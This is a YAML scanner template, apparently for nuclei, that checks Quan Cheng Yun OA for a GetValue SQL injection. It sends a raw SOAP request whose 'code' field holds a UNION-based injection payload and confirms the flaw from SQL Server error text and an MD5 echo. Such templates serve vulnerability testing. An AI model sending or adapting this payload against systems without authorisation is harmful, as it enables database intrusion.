folder-7/poc-yaml-quan-cheng-yun-getvalue-sqli.yaml

id: poc-yaml-quan-cheng-yun-getvalue-sqli
info:
  name: Quan Cheng Yun OA GetValue SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /OA/PES/QCPES.asmx HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: "http://tempuri.org/GetValue"
        Content-Type: text/xml; charset=utf-8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetValue xmlns="http://tempuri.org/">
              <fk_parid>1</fk_parid>
              <code>1' UNION ALL SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- oCWH</code>
            </GetValue>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "在将 nvarchar 值"
          - "转换成数据类型 int 时失败"
          - "0x{{t2}}"
        part: body
      - type: word
        words:
          - "text/xml"
        part: header
